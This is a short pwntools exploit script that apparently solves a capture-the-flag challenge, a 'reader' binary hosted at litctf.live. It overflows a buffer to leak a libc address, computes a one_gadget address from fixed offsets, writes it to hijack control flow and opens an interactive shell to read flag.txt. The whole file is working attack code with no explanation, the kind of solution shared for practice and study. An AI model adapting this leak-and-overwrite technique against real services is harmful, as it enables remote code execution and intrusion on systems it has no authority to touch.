from pwn import *

def fread(data):
	r.sendline(b'1')
	r.recvuntil(b' like to have read:')
	r.send(data)
	r.recvuntil(b'ould you like to do?')

def fshow():
	r.sendline(b'2')
	return r.recvuntil(b' would you like to do?')

while(1):
	#r = process("./reader")
	r = remote("litctf.live", 31789)

	r.recvuntil(b'read today?')
	r.sendline(b'0')
	r.recvuntil(b'at would you like to do?')

	payload = b'a'*0x20 + b'\x48'
	fread(payload)

	result = fshow()
	#print(result)
	if(b'\x7f' in result and b'\xb3' in result):
		result = result.split(b"I've read:\n")[1][:6]
		result = int.from_bytes(result, "little") - 243 - 0x26fc0
		print(hex(result))
		onegadget = result + 0xe6af1
		payload = p64(onegadget)
		fread(payload)
		r.sendline(b'3')
		r.interactive()
		# cat flag.txt		

	else:
		r.close()
		continue
	exit(0)

